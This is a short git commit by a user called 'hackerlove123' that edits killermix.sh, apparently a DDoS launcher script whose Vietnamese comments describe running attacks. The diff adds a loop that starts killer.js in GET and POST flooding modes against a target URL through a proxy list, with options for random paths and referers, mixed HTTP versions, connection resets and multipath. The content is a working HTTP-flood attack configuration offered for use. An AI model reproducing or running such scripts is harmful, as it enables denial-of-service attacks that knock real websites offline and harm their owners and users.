ab07f4995013038e05caed0f36cef8dfe2144036
hackerlove123 <149338972+hackerlove123@users.noreply.github.com>
2025-04-12 20:18:39 +0700

    hehe

--- killermix.sh
+++ killermix.sh
@@ -37,7 +37,14 @@ wait
 export NODE_OPTIONS=--max-old-space-size=8192
 # Chạy tấn công với hmix.js
 for method in GET POST; do 
-  node hmix.js -m "$method" -u "$URL" -s "$TIME" -p live.txt -t 1 -r 1 --full true -d false &
+  node hmix.js -m "$method" -u "$URL" -s "$TIME" -p live.txt -t 1 --full true -d false &
+done
+
+# Chạy tấn công với killer.js
+for method in GET POST; do 
+  node killer.js "$method" "$URL" "$TIME" 5 128 live.txt \
+    --query 1 --delay 1 --referer rand --http mix \
+    --close --randpath --parsed --reset --multipath 5 &
 done
 
 # Chạy tấn công với h1.js
